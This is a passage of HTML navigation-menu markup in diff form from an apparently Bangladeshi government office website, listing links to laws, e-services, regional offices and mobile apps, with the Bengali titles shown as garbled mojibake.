+                    <div class="sub-menu mzr-content " >
+                        <div class="five-col">
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦¡à¦¾à¦‰à¦¨à¦²à§‹à¦¡" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦¡à¦¾à¦‰à¦¨à¦²à§‹à¦¡</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¬à¦¿à¦­à¦¾à¦—à§€à§Ÿ à¦†à¦‡à¦¨" href="http://bdlaws.minlaw.gov.bd"
+                                    style="color: ">à¦¬à¦¿à¦­à¦¾à¦—à§€à§Ÿ à¦†à¦‡à¦¨</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¬à¦¿à¦§à¦¿à¦®à¦¾à¦²à¦¾" href="//bangladesh.gov.bd/site/view/policy"
+                                    style="color: ">à¦¬à¦¿à¦§à¦¿à¦®à¦¾à¦²à¦¾</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦ªà¦°à¦¿à¦ªà¦¤à§à¦° / à¦¨à§€à¦¤à¦¿à¦®à¦¾à¦²à¦¾" href="//bangladesh.gov.bd/site/view/policy"
+                                    style="color: ">à¦ªà¦°à¦¿à¦ªà¦¤à§à¦° / à¦¨à§€à¦¤à¦¿à¦®à¦¾à¦²à¦¾</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦—à¦¾à¦°à§à¦¡à¦«à¦¾à¦‡à¦²" href="//bangladesh.gov.bd/site/view/gurd_files_category"
+                                    style="color: ">à¦—à¦¾à¦°à§à¦¡à¦«à¦¾à¦‡à¦²</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                                            </ul>
+                        </div>
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦¸à§‡à¦¬à¦¾à¦¸à¦®à§‚à¦¹" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦¸à§‡à¦¬à¦¾à¦¸à¦®à§‚à¦¹</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¸à§‡à¦¬à¦¾à¦° à¦¤à¦¾à¦²à¦¿à¦•à¦¾" href="/bn/#"
+                                    style="color: ">à¦¸à§‡à¦¬à¦¾à¦° à¦¤à¦¾à¦²à¦¿à¦•à¦¾</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¸à§‡à¦¬à¦¾à¦•à§à¦žà§à¦œ" href="//services.portal.gov.bd"
+                                    style="color: ">à¦¸à§‡à¦¬à¦¾à¦•à§à¦žà§à¦œ</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¸à¦¿à¦Ÿà¦¿à¦œà§‡à¦¨ à¦šà¦¾à¦°à§à¦Ÿà¦¾à¦°" href="/bn/#"
+                                    style="color: ">à¦¸à¦¿à¦Ÿà¦¿à¦œà§‡à¦¨ à¦šà¦¾à¦°à§à¦Ÿà¦¾à¦°</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦•à§€ à¦¸à§‡à¦¬à¦¾ à¦•à§€à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦¬à§‡à¦¨" href="/bn/site/page/à¦¸à§‡à¦¬à¦¾-à¦ªà§à¦°à¦¾à¦ªà§à¦¤à¦¿à¦°-à¦§à¦¾à¦ªà¦¸à¦®à§‚à¦¹"
+                                    style="color: ">à¦•à§€ à¦¸à§‡à¦¬à¦¾ à¦•à§€à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦¬à§‡à¦¨</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                                            </ul>
+                        </div>
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦ªà¦°à¦¿à¦¦à¦°à§à¦¶à¦¨" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦ªà¦°à¦¿à¦¦à¦°à§à¦¶à¦¨</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦‡à¦‰à¦¨à¦¿à§Ÿà¦¨ à¦…à¦«à¦¿à¦¸ à¦ªà¦°à¦¿à¦¦à¦¶à¦¨" href="/bn/#"
+                                    style="color: ">à¦‡à¦‰à¦¨à¦¿à§Ÿà¦¨ à¦…à¦«à¦¿à¦¸ à¦ªà¦°à¦¿à¦¦à¦¶à¦¨</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦ªà§à¦°à¦•à¦²à§à¦ª à¦ªà¦°à¦¿à¦¦à¦°à§à¦¶à¦¨" href="/bn/#"
+                                    style="color: ">à¦ªà§à¦°à¦•à¦²à§à¦ª à¦ªà¦°à¦¿à¦¦à¦°à§à¦¶à¦¨</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                                            </ul>
+                        </div>
+                                                </div>
+                    </div>
+                </li>
+                                                
+                <!-- Menu Color Admin Custom Start -->
+                    <!--  -->
+                    <!--  -->
+                                                            
+                                                                    <!-- 1  -->
+                                        
+                                                                    <!-- 1  -->
+                                    <!-- Menu Color Admin Custom End -->
+                
+                <li class="mzr-drop menu-link  c3  focusin-drop focusClassDrop" style="background:">
+                    <a href="#" title="à¦Šà¦°à§à¦§à§à¦¬à¦¤à¦¨ à¦…à¦«à¦¿à¦¸" style="color: ">à¦Šà¦°à§à¦§à§à¦¬à¦¤à¦¨ à¦…à¦«à¦¿à¦¸</a>
+                    <div class="sub-menu mzr-content " >
+                        <div class="five-col">
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦¬à¦¿à¦­à¦¾à¦—/à¦œà§‡à¦²à¦¾" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦¬à¦¿à¦­à¦¾à¦—/à¦œà§‡à¦²à¦¾</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¬à¦¿à¦­à¦¾à¦—à§€à§Ÿ à¦•à¦¾à¦°à§à¦¯à¦¾à¦²à§Ÿ" href="//ansarvdp.rajshahidiv.gov.bd/"
+                                    style="color: ">à¦¬à¦¿à¦­à¦¾à¦—à§€à§Ÿ à¦•à¦¾à¦°à§à¦¯à¦¾à¦²à§Ÿ</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦œà§‡à¦²à¦¾ à¦•à¦¾à¦°à§à¦¯à¦¾à¦²à§Ÿ" href="//ansarvdp.bogra.gov.bd"
+                                    style="color: ">à¦œà§‡à¦²à¦¾ à¦•à¦¾à¦°à§à¦¯à¦¾à¦²à§Ÿ</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                                            </ul>
+                        </div>
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦®à¦¨à§à¦¤à§à¦°à¦£à¦¾à¦²à§Ÿ/à¦¦à¦ªà§à¦¤à¦°" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦®à¦¨à§à¦¤à§à¦°à¦£à¦¾à¦²à§Ÿ/à¦¦à¦ªà§à¦¤à¦°</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦®à¦¨à§à¦¤à§à¦°à¦£à¦¾à¦²à§Ÿ/à¦¬à¦¿à¦­à¦¾à¦—" href="//mha.gov.bd"
+                                    style="color: ">à¦®à¦¨à§à¦¤à§à¦°à¦£à¦¾à¦²à§Ÿ/à¦¬à¦¿à¦­à¦¾à¦—</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦…à¦§à¦¿à¦¦à¦ªà§à¦¤à¦°" href="//ansarvdp.gov.bd"
+                                    style="color: ">à¦…à¦§à¦¿à¦¦à¦ªà§à¦¤à¦°</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                                            </ul>
+                        </div>
+                                                </div>
+                    </div>
+                </li>
+                                                
+                <!-- Menu Color Admin Custom Start -->
+                    <!--  -->
+                    <!--  -->
+                                                            
+                                                                    <!-- 1  -->
+                                        
+                                                                    <!-- 1  -->
+                                    <!-- Menu Color Admin Custom End -->
+                
+                <li class="mzr-drop menu-link  c4  focusin-drop focusClassDrop" style="background:">
+                    <a href="#" title="à¦‡-à¦¸à§‡à¦¬à¦¾" style="color: ">à¦‡-à¦¸à§‡à¦¬à¦¾</a>
+                    <div class="sub-menu mzr-content " >
+                        <div class="five-col">
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦œà¦¾à¦¤à§€à§Ÿ à¦‡-à¦¸à§‡à¦¬à¦¾" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦œà¦¾à¦¤à§€à§Ÿ à¦‡-à¦¸à§‡à¦¬à¦¾</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¨à¦¥à¦¿" href="//www.nothi.gov.bd/login"
+                                    style="color: ">à¦¨à¦¥à¦¿</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦‡-à¦¤à¦¥à§à¦¯ à¦•à§‹à¦·" href="http://www.infokosh.gov.bd"
+                                    style="color: ">à¦‡-à¦¤à¦¥à§à¦¯ à¦•à§‹à¦·</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦‡-à¦®à§‹à¦¬à¦¾à¦‡à¦² à¦•à§‹à¦°à§à¦Ÿ" href="//ecourt.gov.bd"
+                                    style="color: ">à¦‡-à¦®à§‹à¦¬à¦¾à¦‡à¦² à¦•à§‹à¦°à§à¦Ÿ</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦­à§‚à¦®à¦¿ à¦¸à§‡à¦¬à¦¾" href="//land.gov.bd"
+                                    style="color: ">à¦­à§‚à¦®à¦¿ à¦¸à§‡à¦¬à¦¾</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶ à¦«à¦°à¦®" href="http://www.forms.gov.bd"
+                                    style="color: ">à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶ à¦«à¦°à¦®</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¸à§‡à¦¬à¦¾à¦•à§à¦žà§à¦œ" href="//services.portal.gov.bd"
+                                    style="color: ">à¦¸à§‡à¦¬à¦¾à¦•à§à¦žà§à¦œ</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦…à¦¨à¦²à¦¾à¦‡à¦¨ à¦†à¦¬à§‡à¦¦à¦¨" href="//nothi.gov.bd/dak_nagoriks/NagorikAbedon"
+                                    style="color: ">à¦…à¦¨à¦²à¦¾à¦‡à¦¨ à¦†à¦¬à§‡à¦¦à¦¨</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦‰à¦¤à§à¦¤à¦°à¦¾à¦§à¦¿à¦•à¦¾à¦° à¦•à§à¦¯à¦¾à¦²à¦•à§à¦²à§‡à¦Ÿà¦°" href="//xn--d5by7bap7cc3ici3m.xn--54b7fta0cc"
+                                    style="color: ">à¦‰à¦¤à§à¦¤à¦°à¦¾à¦§à¦¿à¦•à¦¾à¦° à¦•à§à¦¯à¦¾à¦²à¦•à§à¦²à§‡à¦Ÿà¦°</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦‡-à¦¬à§à¦•" href="http://www.ebook.gov,bd"
+                                    style="color: ">à¦‡-à¦¬à§à¦•</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                                            </ul>
+                        </div>
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦®à§‹à¦¬à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦ª" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦®à§‹à¦¬à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦ª</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¨à¦¥à¦¿ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)" href="//play.google.com/store/apps/details?id=com.tappware.nothipro"
+                                    style="color: ">à¦¨à¦¥à¦¿ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¨à¦¥à¦¿ (à¦†à¦‡ à¦«à§‹à¦¨)" href="//apps.apple.com/us/app/nothi/id1187955540"
+                                    style="color: ">à¦¨à¦¥à¦¿ (à¦†à¦‡ à¦«à§‹à¦¨)</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶-à¦¡à¦¿à¦°à§‡à¦•à§à¦Ÿà¦°à¦¿ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)" href="//play.google.com/store/apps/details?id=com.tappware.ned&amp;hl=en"
+                                    style="color: ">à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶-à¦¡à¦¿à¦°à§‡à¦•à§à¦Ÿà¦°à¦¿ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
+                                                                                                                    <!-- 1  -->
+                                                                        
+                                                                                                                    <!-- 1  -->
+                                                                    <!-- Third Menu Color Admin Custom End -->
+  
+                                <li style="background:">
+                                    <a title="à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶ à¦ªà¦°à§à¦¯à¦Ÿà¦¨ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)" href="//play.google.com/store/apps/details?id=com.tappware.bts&amp;hl=en"
+                                    style="color: ">à¦¬à¦¾à¦‚à¦²à¦¾à¦¦à§‡à¦¶ à¦ªà¦°à§à¦¯à¦Ÿà¦¨ (à¦à¦¨à¦¡à§à¦°à§Ÿà§‡à¦¡)</a>
+									
+									<!-- Start Forth Level -->
+										<ul class="mzr-links">
+																				</ul>
+									
+									<!-- End Forth Level -->
+                                </li>
+
+                                                            </ul>
+                        </div>
+                                                </div>
+                    </div>
+                </li>
+                                                
+                <!-- Menu Color Admin Custom Start -->
+                    <!--  -->
+                    <!--  -->
+                                                            
+                                                                    <!-- 1  -->
+                                        
+                                                                    <!-- 1  -->
+                                    <!-- Menu Color Admin Custom End -->
+                
+                <li class="mzr-drop menu-link  c5  focusin-drop focusClassDrop" style="background:">
+                    <a href="#" title="à¦—à§à¦¯à¦¾à¦²à¦¾à¦°à¦¿" style="color: ">à¦—à§à¦¯à¦¾à¦²à¦¾à¦°à¦¿</a>
+                    <div class="sub-menu mzr-content " >
+                        <div class="five-col">
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦«à¦Ÿà§‹ à¦—à§à¦¯à¦¾à¦²à¦¾à¦°à¦¿" href="/bn/site/photo_gallery/à¦›à¦¬à¦¿">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦«à¦Ÿà§‹ à¦—à§à¦¯à¦¾à¦²à¦¾à¦°à¦¿</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                                            </ul>
+                        </div>
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦­à¦¿à¦¡à¦¿à¦“ à¦—à§à¦¯à¦¾à¦²à¦¾à¦°à¦¿" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦­à¦¿à¦¡à¦¿à¦“ à¦—à§à¦¯à¦¾à¦²à¦¾à¦°à¦¿</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                                            </ul>
+                        </div>
+                                                </div>
+                    </div>
+                </li>
+                                                
+                <!-- Menu Color Admin Custom Start -->
+                    <!--  -->
+                    <!--  -->
+                                                            
+                                                                    <!-- 1  -->
+                                        
+                                                                    <!-- 1  -->
+                                    <!-- Menu Color Admin Custom End -->
+                
+                <li class="mzr-drop menu-link  c6  focusin-drop focusClassDrop" style="background:">
+                    <a href="#" title="à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—" style="color: ">à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—</a>
+                    <div class="sub-menu mzr-content " >
+                        <div class="five-col">
+                                                                                                
+
+                        
+                        <!-- Sub-Menu Color Admin Custom Start -->
+                            <!--  -->
+                            <!--  -->
+                                                                                    
+                                                                                            <!-- 1  -->
+                                                        
+                                                                                            <!-- 1  -->
+                                                    <!-- Sub-Menu Color Admin Custom End -->
+						
+                        <div class="one-col">
+                                                                                            <a title="à¦…à¦«à¦¿à¦¸ à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—" href="/bn/#">
+                                    <h6 style="background:; color: ;  font-size: 16px!important;">à¦…à¦«à¦¿à¦¸ à¦¯à§‹à¦—à¦¾à¦¯à§‹à¦—</h6>
+                                </a>
+                                                        
+                            <ul class="mzr-links">
+                                
+                                                                                                
+                                <!-- Third Menu Color Admin Custom Start -->
+                                    <!--  -->
+                                    <!--  -->
+                                                                                                            
